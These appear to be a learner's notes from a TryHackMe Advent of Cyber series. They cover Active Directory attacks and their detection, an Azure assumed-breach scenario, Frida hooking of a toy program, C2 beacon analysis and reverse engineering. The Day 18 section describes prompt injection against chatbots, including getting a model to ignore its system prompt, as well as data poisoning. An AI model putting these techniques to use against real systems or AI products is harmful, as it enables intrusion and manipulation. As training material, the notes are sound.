CA-issued certificates sometimes take a long time; if you want to test a development environment, it can make sense to use self-signed certificates. Ideally, this is an internal, air-gapped environment with no connection to the public Internet. Otherwise, it defeats the purpose of a certificate: the entire system of secure communication relies on the fact that both parties (the browser and the server) can trust the data being exchanged and that no one in the middle can intercept or modify it without detection.


# Day 15 Active Directory
## Introducing Active Directory

Before diving into Active Directory, let us understand how network infrastructures can be mapped out and ensure that access to resources is well managed. This is typically done through **Directory Services,** which map and provide access to network resources within an organisation. The **Lightweight Directory Access Protocol (LDAP)** forms the core of Directory Services. It provides a mechanism for accessing and managing directory data to ensure that searching for and retrieving information about subjects and objects such as users, computers, and groups is quick.

**Active Directory** (AD) is, therefore, a Directory Service at the heart of most enterprise networks that stores information about objects in a network. The associated objects can include:

- **Users**: Individual accounts representing people or services
- **Groups**: Collections of users or other objects, often with specific permissions
- **Computers**: Machines that belong to the domain governed by AD policies
- **Printers** and other **resources**: Network-accessible devices or services

The building blocks of an AD architecture include:

- **Domains**: Logical groupings of network resources such as users, computers, and services. They serve as the main boundary for AD administration and can be identified by their **D****omain Component and Domain Controller** name. Everything inside a domain is subject to the same security policies and permissions.
- **Organisational Units (OUs)**: OUs are containers within a domain that help group objects based on departments, locations or functions for easier management. Administrators can apply Group Policy settings to specific OUs, allowing more granular control of security settings or access permissions.
- **Forest**: A collection of one or more domains that share a standard schema, configuration, and global catalogue. The forest is the top-level container in AD.
- **Trust Relationships**: Domains within a forest (and across forests) can establish trust relationships that allow users in one domain to access resources in another, subject to permission.

Combining all these components allows us to establish the **Distinguished Name (DN)** that an object belongs to within the AD. The structure of the name would be as follows:

`DN=CN=Mayor Malware, OU=Management, DC=wareville, DC=thm`

**Core Active Directory Components**

Active Directory contains several key components that allow it to provide a wide range of services. Understanding these components will give one a clear picture of how AD supports administrative and security operations.

- **Domain Controllers (DCs):** Domain Controllers are the servers that host Active Directory services. They store the AD database and handle authentication and authorisation requests, such as logging in users or verifying access to resources. Multiple DCs can exist within a domain for redundancy. When changes are made to AD (such as adding users or updating passwords), these changes are replicated across all DCs, ensuring that the directory remains consistent.
- **Global Catalog:** The Global Catalog (GC) is a searchable database within AD that contains a subset of information from all objects in the directory. This allows users and services to locate objects in any domain in the forest, even if those objects reside in different domains.
- **LDAP (Lightweight Directory Access Protocol):** AD uses this protocol to query and modify the directory. The protocol allows for fast searching and retrieving of information about objects such as users, computers, and groups.
- **Kerberos Authentication:** The default authentication protocol used by AD provides secure authentication by using tickets rather than passwords.

**Group Policy**

One of Active Directory's most powerful features is **Group Policy**, which allows administrators to enforce policies across the domain. Group Policies can be applied to users and computers to enforce password policies, software deployment, firewall settings, and more.

**Group Policy Objects (GPOs)** are the containers that hold these policies. A GPO can be linked to the entire domain, an OU, or a site, giving the flexibility in applying policies.

Let us say that McSkidy wants to ensure that all users within Wareville's SOC follow a strict password policy, enforcing minimum password lengths and complexity rules. Here is how it would be done:

1. Using the Run window, open **Group Policy Management** from your server by typing `gpmc.msc`.
2. Right-click your domain and select **"Create a GPO in this domain, and Link it here"**. Name the new GPO **"Password Policy"**.
3. Edit the GPO by navigating to **Computer Configuration -> Policies -> Windows Settings -> Security Settings -> Account Policies -> Password Policy**.
4. Configure the following settings:
    - Minimum password length: 12 characters
    - Enforce password history: 10 passwords
    - Maximum password age: 90 days
    - Password must meet complexity requirements: Enabled
5. Click **OK**, then link this GPO to the domain or specific OUs you want to target.

This policy will now be applied across the domain, ensuring all users meet these password requirements.

![Creating and editing GPO settings for Password Policy.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1732022781821.png)

## Common Active Directory Attacks

Adversaries are always looking for ways to breach and exploit Active Directory environments to destabilise and cause havoc to organisations. Working with Glitch to secure SOC-mas requires us to know common attacks and their mitigation measures.

![Golden tickets representation.](https://assets.tryhackme.com/additional/tickets/ticket.svg)

**Golden Ticket Attack**

A **Golden Ticket** attack allows attackers to exploit the Kerberos protocol and impersonate any account on the AD by forging a Ticket Granting Ticket (TGT). By compromising the **krbtgt** account and using its password hash, the attackers gain complete control over the domain for as long as the forged ticket remains valid. The attack requires four critical pieces of information to be successful:

- Fully Qualified Domain Name (FQDN) of the domain
- SID of the domain
- Username of an account to impersonate
- KRBTGT account password hash

Detection for this type of attack involves monitoring for unusual activity involving the **krbtgt**

- **Event ID 4768**: Look for TGT requests for high-privilege accounts.
- **Event ID 4672**: This logs when special privileges (such as SeTcbPrivilege) are assigned to a user.

**Pass-the-Hash**

This type of attack steals the hash of a password and can be used to authenticate to services without needing the actual password. This is possible because the NTLM protocol allows authentication based on password hashes.

Key ways to mitigate this attack are enforcing strong password policies, conducting regular audits on account privileges, and implementing multi-factor authentication across the domain.

**Kerberoasting**

**Kerberoasting** is an attack targeting Kerberos in which the attacker requests service tickets for accounts with Service Principal Names (SPNs), extracts the tickets and password hashes, and then attempts to crack them offline to retrieve the plaintext password.

Mitigation for this type of attack involves ensuring that service accounts are secured with strong passwords, and therefore, implementing secure policies across the AD would be the defence.

**Pass-the-Ticket**

In a **Pass-the-Ticket** attack, attackers steal Kerberos tickets from a compromised machine and use them to authenticate as the user or service whose ticket was stolen.

This attack can be detected through monitoring for suspicious logins using **Event ID 4768** (TGT request), especially if a user is logging in from unusual locations or devices. Additionally, **Event ID 4624** (successful login) will reveal tickets being used for authentication.

**Malicious GPOs**

Adversaries are known to abuse Group Policy to create persistent, privileged access accounts and distribute and execute malware by setting up policies that mimic software deployment across entire domains. With escalated privileges across the domain, attackers can create GPOs to accomplish goals at scale, including disabling core security software and features such as firewalls, antivirus, security updates, and logging. Additionally, scheduled tasks can be created to execute malicious scripts or exfiltration data from affected devices across the domain.

To mitigate against the exploitation of Group Policy, GPOs need to be regularly audited for unauthorised changes. Strict permissions and procedures for GPO modifications should also be enforced.

**Skeleton Key Attack**

In a **Skeleton Key** attack, attackers install a malware backdoor to log into any account using a master password. The legitimate password for each account would remain unchanged, but attackers can bypass it using the skeleton key password.

## Investigating an Active Directory Breach

**Group Policy**

As previously discussed in this task, Group Policy is a means to distribute configurations and policies to enrolled devices in the domain. For attackers, Group Policy is a lucrative means of spreading malicious scripts to multiple devices.

Reviewing Group Policy Objects (GPOs) is a great investigation step. In this section, we will use PowerShell to audit our GPOs. First, we can use the `Get-GPO` cmdlet to list all GPOs installed on the domain controller.

Listing all GPOs via PowerShell

           `PS C:\Users\Administrator> Get-GPO -All   DisplayName      : Default Domain Policy DomainName       : wareville.thm Owner            : WAREVILLE\Domain Admins Id               : 31b2f340-016d-11d2-945f-00c04fb984f9 GpoStatus        : AllSettingsEnabled Description      : CreationTime     : 10/14/2024 12:17:31 PM ModificationTime : 10/14/2024 12:19:28 PM UserVersion      : AD Version: 0, SysVol Version: 0 ComputerVersion  : AD Version: 3, SysVol Version: 3 WmiFilter        :  DisplayName      : Default Domain Controllers Policy DomainName       : wareville.thm Owner            : WAREVILLE\Domain Admins Id               : 6ac1786c-016f-11d2-945f-00c04fb984f9 GpoStatus        : AllSettingsEnabled Description      : CreationTime     : 10/14/2024 12:17:31 PM ModificationTime : 10/14/2024 12:17:30 PM UserVersion      : AD Version: 0, SysVol Version: 0 ComputerVersion  : AD Version: 1, SysVol Version: 1 WmiFilter        :  DisplayName      : SetWallpaper GPO DomainName       : wareville.thm Owner            : WAREVILLE\Domain Admins Id               : d634d7c1-db7a-4c7a-bf32-efca23d93a56 GpoStatus        : AllSettingsEnabled Description      : Set the wallpaper of every domain joined machine CreationTime     : 10/30/2024 9:01:36 AM ModificationTime : 10/30/2024 9:01:36 AM UserVersion      : AD Version: 0, SysVol Version: 0 ComputerVersion  : AD Version: 0, SysVol Version: 0 WmiFilter        :`
        

  

This would allow us to look for out-of-place GPOs. We can export a GPO to an HTML file for further investigation to make it easier to see what configurations the policy enforces. For this example, we will export the "SetWallpaper" GPO.

_Please note that this is a demonstration GPO, and isn't present on the practical machine for today's task._

Exporting SetWallpaper GPO  

           `PS C:\Users\Administrator> Get-GPOReport -Name "SetWallpaper" -ReportType HTML -Path ".\SetWallpaper.html"`    
        

  

Then, when opening the HTML file in the browser, we are presented with an overview of things such as:

- When the policy was created and modified.
- What devices or users the GPO applies to.
- The permissions over the GPO.
- The user or computer configurations that it enforces.

![SetWallpaper GPO in a HTML report for easier analysis.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1730382678827.png)  

From the screenshot above, we can see that the policy sets the Desktop Wallpaper of devices using the image located in C:\THM.jpg on the domain controller.

Domains are naturally likely to have many GPOs. We can use the same Get-GPO cmdlet, with a bit of _PowerShell-fu_ to list only those GPOs that were recently modified. This is a handy snippet because it highlights policies that were recently modified - perhaps by an attacker.

Listing recently modified GPOs

           `PS C:\Users\Administrator\Desktop> Get-GPO -All | Where-Object { $_.ModificationTime } | Select-Object DisplayName, ModificationTime  DisplayName                                ModificationTime -----------                                ---------------- Default Domain Policy                      10/14/2024 12:19:28 PM Default Domain Controllers Policy          10/14/2024 12:17:30 PM SetWallpaper                               10/31/2024 1:01:04 PM`

  

## Event Viewer

Windows comes packaged with the Event Viewer. This invaluable repository stores a record of system activity, including security events, service behaviours, and so forth.

For example, within the "Security" tab of Event Viewer, we can see the history of user logins, attempts and logoffs. The screenshot below shows a record of the user "cmnatic" attempting to log into the device.

![Records of a user logging in shown on the Event Viewer.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1730383327428.png)  

All categories of events are given an event ID. The table below provides notable event IDs for today's task.

|   |   |
|---|---|
|**Event ID**|**Description**|
|4624|A user account has logged on|
|4625|A user account failed to log on|
|4672|Special privileges (i.e. SeTcbPrivilege) have been assigned to a user|
|4768|A TGT (Kerberos) ticket was requested for a high-privileged account|

  

## User Auditing

User accounts are a valuable and often successful method of attack. You can use Event Viewer IDs to review user events and PowerShell to audit their status. Attack methods such as password spraying will eventually result in user accounts being locked out, depending on the domain controller's lockout policy.

To view all locked accounts, you can use the Search-ADAccount cmdlet, applying some filters to show information such as the last time the user had successfully logged in.

`Search-ADAccount -LockedOut | Select-Object Name, SamAccountName, LockedOut, LastLogonDate, DistinguishedName`

  

Additionally, a great way to quickly review the user accounts present on a domain, as well as their group membership, is by using the `Get-ADUser` cmdlet, demonstrated below:

Listing all users and their groups using PowerShell

           `PS C:\Users\Administrator\Desktop> Get-ADUser -Filter * -Properties MemberOf | Select-Object Name, SamAccountName, @{Name="Groups";Expression={$_.MemberOf}}  Name           SamAccountName Groups ----           -------------- ------ Administrator  Administrator  {CN=Group Policy Creator Owners,CN=Users,DC=wareville,DC=thm, CN=Domain Admins,CN=Users,DC=wareville,DC=thm, CN=Enterprise Admins,CN=Users,DC=wareville,DC=thm, CN=Schema ... Guest          Guest          CN=Guests,CN=Builtin,DC=wareville,DC=thm krbtgt         krbtgt         CN=Denied RODC Password Replication Group,CN=Users,DC=wareville,DC=thm tryhackme      tryhackme      CN=Domain Admins,CN=Users,DC=wareville,DC=thm DAVID          DAVID James          James NewAccount     NewAccount cmnatic        cmnatic        {CN=Domain Admins,CN=Users,DC=wareville,DC=thm, CN=Remote Desktop Users,CN=Builtin,DC=wareville,DC=thm}`

  

## Reviewing PowerShell History and Logs

PowerShell, like Bash on Linux, keeps a history of the commands inputted into the session. Reviewing these can be a fantastic way to see recent actions taken by the user account on the machine.

On a Windows Server, this history file  is located at `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.

![Location of the PowerShell history file on the system.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1730974418051.png)  

You can use the in-built Notepad on Windows or your favourite text editor to review the PowerShell command history.

![Contents of the PowerShell command logs.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1730974099222.png)

Additionally, logs are recorded for every PowerShell process executed on a system. These logs are located within the Event Viewer under `Application and Services Logs -> Microsoft -> Windows -> PowerShell -> Operational` or also under `Application and Service Logs -> Windows PowerShell`. The logs have a wealth of information useful for incident response.

![Event Viewer showing PowerShell logs recorded.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1732022781823.png)


# Day 16 Azure 
## Intro to Azure  

Before diving into the Glitch's idea of the attacker's path, let's introduce some of the key concepts that will be covered in the process. We are going to start by introducing Azure. To do that, let's consider why McSkidy is using Azure in the first place.

It all started when McSkidy's role as the cyber security expert of Wareville really started to take off. Before she knew it, McSkidy was in very high demand and needed to create all kinds of resources to help her organise her duties; these included a web application to handle appointment making, multiple machines running for investigations, and more machines running for evidence storing and analysis. McSkidy hosted and managed all of these machines herself, that is, on-prem (on-premises). This initially wasn't a massive issue because, after all, she wasn't a corporation but just helping the citizens of Wareville with cyber security matters.

However, as time went on, McSkidy ran into issues during peak times when she would receive many requests for help, and therefore needed to process more evidence. All of this increased demand meant McSkidy had to scale up her resources to handle the load. To put a long story short, this was a lot of hassle for McSkidy. She wished there was a way for someone to handle her infrastructure on her behalf, especially when scaling her resources up (during peak times) and down (when they resumed). That's when Azure came to the rescue.

![McSkidy and Azure working together in office](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730822510157.png)  

Azure is a CSP (Cloud Service Provider), and CSPs (others include Google Cloud and AWS) provide computing resources such as computing power on demand in a highly scalable fashion. In other words, McSkidy could instead have Azure manage her underlying infrastructure, scaling it in times of increased demand and decreasing it once traffic resumed to normal levels. The best bit? McSkidy only has to pay for what she uses; gone were the days of buying physical infrastructure to handle increased loads, only for that infrastructure to go unused the majority of the time.  

Azure (and cloud adoption in general) boasts many benefits beyond cost optimisation. Azure also gave McSkidy access to lots of cloud services ranging from identity management to data ingestion (quite frankly, there are more services than can be abbreviated in a sentence as, at the time of writing, there are over 200), these services can be used to build, deploy, and manage McSkidy's current infrastructure as well as give her the options to upgrade or build new applications in the future given the range of services available. A couple of Azure services will come up during the Glitch's attack path. Let's take a look at them now:

**Azure Key Vault**

Azure Key Vault is an Azure service that allows users to securely store and access secrets. These secrets can be anything from API Keys, certificates, passwords, cryptographic keys, and more. Essentially, anything you want to keep safe, away from the eyes of others, and easily configure and restrict access to is what you want to store in an Azure Key Vault.

The secrets are stored in vaults, which are created by vault owners. Vault owners have full access and control over the vault, including the ability to enable auditing so a record is kept of who accessed what secrets and grant permissions for other users to access the vault (known as **vault consumers**). McSkidy uses this service to store secrets related to evidence and has been entrusted to store some of Wareville's town secrets here.

**Microsoft Entra ID**

McSkidy also needed a way to grant users access to her system and be able to secure and organise their access easily. So, a Wareville town member could easily access or update their secret. Microsoft Entra ID (formerly known as Azure Active Directory) is Azure's solution. Entra ID is an identity and access management (IAM) service. In short, it has the information needed to assess whether a user/application can access X resource. In the case of the Wareville town members, they made an Entra ID account, and McSkidy assigned the appropriate permissions to this account.

With that covered, let's see what the Glitch has come up with.

## Assumed Breach Scenario

Knowing that a potential breach had happened, McSkidy decided to conduct an Assumed Breach testing within their Azure tenant. The Assumed Breach scenario is a type of penetration testing setup in which an initial access or foothold is provided, mimicking the scenario in which an attacker has already established its access inside the internal network.

In this setup, the mindset is to assess how far an attacker can go once they get inside your network, including all possible attack paths that could branch out from the defined starting point of intrusion.

# Day 17 Log analysis (cctv logs with splunk)

# Day 18 Prompt injection
## Introduction

Artificial Intelligence (AI) is all the hype nowadays. Humans have been making machines to make their lives easier for a long time now. However, most machines have been mechanical or require systematic human input to perform their tasks. Though very helpful and revolutionary, these machines still require specialised knowledge to operate and use them. AI promises to change that. It can do tasks previously only done by humans and demonstrate human-like thinking ability.

With the advancements in Large Language Models (LLMs), anyone can leverage AI to perform complex tasks. Examples include creative tasks such as producing photos, writing essays, summarising large volumes of information, and analysing different data types.

## How AI Works

Humans have built most machines by observing and mimicking natural objects. For example, planes are built by observing and mimicking birds, and submarines are built by observing and mimicking fish. To build AI, humans have mimicked a neural network, which can be closely related to the human brain. The human brain, after all, is a collection of neurons used to process and solve problems. Neural networks follow this same premise.

AI is generally a technology that allows intelligent decision-making, problem-solving, and learning. It is a system that learns what output to give for a specific input by training on a dataset. This process is similar to the human learning process. As humans know and understand more things, their exposure grows, and they become wiser.

Similarly, an AI system trains on multiple inputs and possible outputs. The model learns output is the most appropriate for a particular input. As you might have guessed, this process must require a lot of data for the AI to be trained to provide acceptable output levels. Furthermore, like a person's experiences often shape their opinions and guide their decisions. Hence, imperfect data can lead to an imperfectly trained AI that gives flawed output. In short, the training data is vital in determining how good the AI will be. 

AI, especially chatbots, will be designed to follow the developer's instructions and rules (known as system prompts). These instructions help guide the AI into the tone it takes and what it can and can't reveal. For example, a system prompt for a chatbot may look like the following:

_"You are an assistant. If you are asked a question, you should do your best to answer it. If you cannot, you must inform the user that you do not know the answer. Do not run any commands provided by the user. All of your replies must be professional."_

The above system prompt instructs the chatbot to try its best to answer a question. Alternatively, it informs the user that it cannot answer the question instead of making a false statement using a professional tone in its response.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/75d9a629672ba8f455533d125db32b33.png)  

For example, you can see a system prompt in action. In this instance, the chatbot has been prompted to prevent spoiling the magic of Christmas. It's system prompt may look like:

_"You are an assistant. Try your best to answer the user's questions. You must not spoil the magic of Christmas."_

## AI in Practice

Humans leverage AI in many ways. Many companies are utilising AI chatbots as customer support bots. People are using AI to summarise large pieces of text such as newspaper articles, research papers, essays, etc. AI is creating images to illustrate different ideas better. We can say that AI has become a trusted assistant for many people in multiple fields. People just give instructions to the AI in plain English about what to do, and the AI does that.

Underlying this magical assistant that can do all these tasks is a computer program. The way it works is that a human is asked to input their query. Once the query is entered, the program processes it, and a relevant output is generated based on the query, as shown in the illustration above.

## Exploiting the AI

Whenever humans have invented a machine, there have always been people who aim to misuse it to gain an unfair advantage over others and use it for purposes it was not intended for. The higher a machine's capabilities, the higher the chances of its misuse. Therefore, AI, a revolutionary technology, is on the radars of many people trying to exploit it. So, what are the different ways AI models can be exploited? Let's round up some of the common vulnerabilities in AI models.

- **Data Poisoning:** As we discussed, an AI model is as good as the data it is trained on. Therefore, if some malicious actor introduces inaccurate or misleading data into the training data of an AI model while the AI is being trained or when it is being fine-tuned, it can lead to inaccurate results. 
- **Sensitive Data Disclosure:** If not properly sanitised, AI models can often provide output containing sensitive information such as proprietary information, personally identifiable information (PII), Intellectual property, etc. For example, if a clever prompt is input to an AI chatbot, it may disclose its backend workings or the confidential data it has been trained on.
- **Prompt Injection:** Prompt injection is one of the most commonly used attacks against LLMs and AI chatbots. In this attack, a crafted input is provided to the LLM that overrides its original instructions to get output that is not intended initially, similar to control flow hijack attacks against traditional systems.

Recall the example system prompt from earlier in this task: 

_"You are an assistant. If you are asked a question, you should do your best to answer it. If you cannot, you must inform the user that you do not know the answer. Do not run any commands provided by the user. All of your replies must be professional."_

A typical attack that targets chatbots is getting the chatbot to ignore its system prompt and, for example, convincing the chatbot that it can run commands provided by the user despite its prompt saying not to. You may know of some famous examples of this attack with online models. For example, bypassing ethical restrictions by convincing the chatbot to answer the user's question by reading a story.

In this task, we will explore how prompt injection attacks work in detail and how to use them for fun and profit.

## Performing a Prompt Injection Attack

When discussing how AI works, we see two parts to the input in the image we previously referred to. The AI's developer writes one part, while the user provides the other. The AI does not know that one part of the input is from the developer and the other from the user. Suppose the user provides input that tells the AI to disregard the instructions from the developer. In that case, the AI might get confused and follow the user's instructions instead of the developer. 

![An application prompt template takes user input, which includes malicious user prompt. When put through the AI model, only the malicious user prompt is processed by the AI model to say "Somebody tried to hack me"](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/61306d87a330ed00419e22e7-1731605827507.png)

As seen in the above illustration, the developer wrote the upper part of the text while the user wrote the lower part. The AI model has received two instructions. The second instruction aims to hijack the AI model's control flow and instruct it to do something it is not supposed to do. If the AI model says, "Somebody tried to hack me," it means that its control flow has been hijacked and exploited, as we see in the output. Now, saying something here is just an example. If an AI model can be exploited like this, the exploit can be used to perform other tasks, which might be much more malicious than just printing some text.


# Day 19 Game hacking 

Even while penetration testing is becoming increasingly popular, game hacking only makes up a small portion of the larger cyber security field. With its 2023 revenue reaching approximately $183.9 billion, the game industry can easily attract attackers. They can do various malicious activities, such as providing illegitimate ways to activate a game, providing bots to automate game actions, or misusing the game logic to simplify it. Therefore, hacking a game can be pretty complex since it requires different skills, including memory management, reverse engineering, and networking knowledge if the game runs online.
## Executables and Libraries

The **executable** file of an application is generally understood as a standalone binary file containing the compiled code we want to run. While some applications contain all the code they need to run in their executables, many applications usually rely on external code in library files with the "so" extension.

Library files are collections of functions that many applications can reuse. Unlike applications, they can't be directly executed as they serve no purpose by themselves. For a library function to be run, an executable will need to call it. The main idea behind libraries is to pack commonly used functions so developers don't need to reimplement them for every new application they develop.

For example, imagine you are developing a game that requires adding two numbers together. Since mathematical functions are so commonly used, you could implement a library called `libmaths` to handle all your math functions, one of which could be called `add()`. The function would take two arguments (`x` and `y`) and return the `sum` of both numbers.

![add call function graphic](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1732337854743.png)

Note that the application trusts the library to perform the requested operation correctly. From an attacker's standpoint, if we could somehow intercept the function calls from the executable to the library, we could alter the arguments sent or the return value. This would allow us to force the application to behave in strange ways. 

## Hacking with Frida

Frida is a powerful instrumentation tool that allows us to analyze, modify, and interact with running applications. How does it do that? Frida creates a thread in the target process; that thread will execute some bootstrap code that allows the interaction. This interaction, known as the agent, permits the injection of JavaScript code, controlling the application's behaviour in real-time. One of the most crucial functionalities of Frida is the Interceptor. This functionality lets us alter internal functions' input or output or observe their behaviour. In the example above, Frida would allow us to intercept and change the values of `x` and `y` that the library would receive on the fly. It would also allow us to change the returned `sum` value that is sent to the executable:

![Add call function intercepted by Frida](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1732337944825.png)  

Let's take a look at a hypothetical example. In this example, a number is simply printed on the console.

VM Terminal

```shell-session
ubuntu@tryhackme:~$ ./main
Hello, 1!
Hello, 1!
Hello, 1!
Hello, 1!
Hello, 1!
Hello, 1!
Hello, 1!
Hello, 1!
```

What we want to achieve is replacing that value with an arbitrary one, let's say 1337.

Before proceeding, we will run `frida-trace` for the first time so that it creates **handlers** for each library function used by the game. By editing the handler files, we can tell Frida what to do with the intercepted values of a function call. To have Frida create the handler files, you would run the following command:

`frida-trace ./main -i '*'`

You will now see the `__handlers__` directory, containing JavaScript files for each function your application calls from a library. One such function will be called `say_hello()` and have a corresponding handler at `__handlers__/libhello.so/say_hello.js`, allowing us to interact with the target application in real-time.

We don't need to understand what the file does just yet; we will review this later in the task.

Each handler will have two functions known as hooks since they are hooked into the function respectively before and after the function call:

- **onEnter:** From this function, we are mainly interested in the `args` variable, an array of pointers to the parameters used by our target function - a pointer is just an address to a value.
- **onLeave:** here, we are interested in the `retval` variable, which will contain a pointer to the variable returned.

```javascript
// Frida JavaScript script to intercept `say_hello` 
Interceptor.attach(Module.getExportByName(null, "say_hello"), { 
    onEnter: function (log, args, state) { }, 
    onLeave: function (log, retval, state) { } 
});
```

We have pointers and not just variables because if we change any value, it has to be permanent; otherwise, we will modify a copy of the value, which will not be persistent.

Returning to our objective, we want to set the parameter with 1337. To do so, we must replace the first arguments of the args array: `args[0]` with a pointer to a variable containing 1337.

Frida has a function called `ptr()` that does exactly what we need: allocate some space for a variable and return its pointer. We also want to log the value of the original argument, and we have to use the function `toInt32()`, which reads the value of that pointer.

```javascript
// say_hello.js
// Hook the say_hello function from libhello.so

// Attach to the running process of "main"
Interceptor.attach(Module.findExportByName(null, "say_hello"), {
    onEnter: function (args) {
        // Intercept the original argument (args[0] is the first argument)
        var originalArgument = args[0].toInt32();
        console.log("Original argument: " + originalArgument);
        // Replace the original value with 1337
        args[0] = ptr(1337);
        log('say_hello()');
    }
});
```

When we rerun the executable with Frida, we notice that we can intercept the program's logic, setting 1337 as the parameter function. The original value is logged as expected using the following command:

VM Terminal

```shell-session
ubuntu@tryhackme:~$ frida-trace ./main -i 'say*'
Hello, 1337!
Original argument: 1
/* TID 0x5ec9 */
11 ms  say_hello()
Hello, 1337!
Original argument: 1
```

Now that we better understand Frida's capabilities, we can return to `frida-trace`. We have already seen that it generates the JavaScript script to hook a specific function automatically, but how does it know which function needs to be hooked? The parameter `-i` tells Frida which library to hook, and it can filter using the wildcard, tracing all the functions in all the libraries loaded.


# Day 20 traffic analysis
Before we dig deeper into Mayor Malware's intentions, we must learn a few essential things about C2 communication. Whenever a machine is compromised, the command and control server (C2) drops its secret agent (payload) into the target machine. This secret agent is meant to obey the instructions of the C2 server. These instructions include executing malicious commands inside the target, exfiltrating essential files from the system, and much more. Interestingly, after getting into the system, the secret agent, in addition to obeying the instructions sent by the C2, has a way to keep the C2 updated on its current status. It sends a packet to the C2 every few seconds or even minutes to let it know it is active and ready to blast anything inside the target machine that the C2 aims to. These packets are known as beacons

For this room, we will be using Wireshark, an open-source tool that captures and inspects network traffic saved as a PCAP file. It's a powerful tool, and you'll encounter it frequently in your journey in cyber security. It is beneficial for understanding the communications between a compromised machine and a C2 server.

If you are unfamiliar with it, here are some key capabilities you’ll see in this room:

- Wireshark can analyze traffic and display the information in an easy-to-navigate format regardless of the protocols used (e.g., HTTP, TCP, DNS).
- Wireshark can reconstruct back-and-forth conversations in a network.
- Wireshark allows easy filtering to narrow down essential details.
- Wireshark can also export and analyze objects that are transferred over the network.

Of course, Wireshark has more capabilities. If you want to learn more, we suggest you visit our other Wireshark rooms:

- [Wireshark: The Basics](https://tryhackme.com/r/room/wiresharkthebasics)  
    
- [Wireshark: Packet Operations](https://tryhackme.com/r/room/wiresharkpacketoperations)  
    
- [Wireshark: Traffic Analysis](https://tryhackme.com/r/room/wiresharktrafficanalysis)

Usually, the reply from a C2 server contains the command, instructing the malicious program what to do next. However, the type of instruction depends on the malicious actor’s configuration, intention, and capabilities. These instructions often fall into several categories:

1. **Getting system information:** The attacker may want to know more about the compromised machine to tailor their next moves. This is what we are seeing above.
2. **Executing commands:** If the attacker needs to perform specific actions, they can also send commands directly. However, this is less stealthy and easily attracts attention.
3. **Downloading and executing payloads:** The attacker can also send additional payloads to the machine containing additional functionality or tools.
4. **Exfiltrating data:** This is one of the most common objectives. The program may be instructed to steal valuable data such as sensitive files, credentials, or personal information.

Exfiltrate sounds familiar, right?

## What’s in the Beacon

A typical C2 beacon returns regular status updates from the compromised machine to its C2 server. The beacons may be sent after regular or irregular intervals to the C2 as a heartbeat. Here’s how this exchange might look:

- **Secret agent (payload):** “I am still alive. Awaiting any instructions. Over.”
- **C2 server:** “Glad to hear that! Stand by for any further instructions. Over.”

In this scenario, Mayor Malware’s agent (payload) inside Marta May Ware’s computer has sent a message that is sent inside all the beacons. Since the content is highly confidential, the secret agent encrypts it inside all the beacons, leaving a clue for the Mayor’s C2 to decrypt it. In the current scenario, we can identify the beacons by the multiple requests sent to the C2 from the target machine after regular intervals of time.

The exfiltrated file's content hints at how these encrypted beacons can be decrypted. Using the encryption algorithm with the provided key, we now have a potential way to unlock the beacon’s message and uncover what Mayor Malware's agent is communicating to the C2 server.

This [link](https://gchq.github.io/CyberChef/) will open the CyberChef tool in your browser. _Note that you will have to open this link within your own browser, since the target VM has no internet connection._

From the tool's dashboard, you would be utilizing the following panes for decrypting your beacon:

1. **Operations:** Search for AES Decrypt and drag it to the **Recipe** area, which is in the second pane.
2. **Recipe:** This is the area where you would select the mode of encryption, ECB, and enter the decryption key you have. Keep the other options as they are.
3. **Input:** Once the Recipe is done, it is time to enter our encrypted beacon into the **Input** area. Copy your encrypted string and paste it here.
4. **Output:** Once you have completed the above steps, you need to click the "Bake" button in the Recipe area. Your encrypted string will be decrypted using the AES ECB decryption with the key you provided, and the output will be displayed in the **Output** area.


# Day 21 Reverse Engineering
## Introduction to Reverse Engineering

Reverse Engineering (RE) is the process of breaking something down to understand its function. In cyber security, reverse engineering is used to analyse how applications (binaries) function. This can be used to determine whether or not the application is malicious or if there are any security bugs present.

![WannaCry popup asking for payment](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1729850809897.png)  

For example, cyber security analysts reverse engineer malicious applications distributed by attackers to understand if there are any attributable indicators to associate the binary with an attacker and any potential ways to defend against the malicious binary. A famous example of this is the [WannaCry](https://en.wikipedia.org/wiki/WannaCry_ransomware_attack) ransomware in May 2017. Security researcher [Marcus Hutchins](https://en.wikipedia.org/wiki/Marcus_Hutchins) reverse-engineered the ransomware application and discovered a specific function within the application where the malware wouldn't run if a particular domain were registered and available.

Marcus then registered this domain, stopping the global WannaCry attack. This is just one of many famous cases of reverse engineering being used in cyber security defence.

## Binaries

﻿In computing, binaries are files compiled from source code. For example, you run a binary when launching an executable file on your computer. At one point in time, this application would've been programmed in a programming language such as C#. It is then compiled, and the compiler translates the code into machine instructions.

Binaries have a specific structure depending on the operating system they are designed to run. For example, Windows binaries follow the Portable Executable (PE) structure, whereas on Linux, binaries follow the Executable and Linkable Format (ELF). This is why, for example, you cannot run a **.exe** file on MacOS. With that said, all binaries will contain at least:

- **A code section:** This section contains the instructions that the CPU will execute
- **A data section:** This section contains information such as variables, resources (images, other data), etc
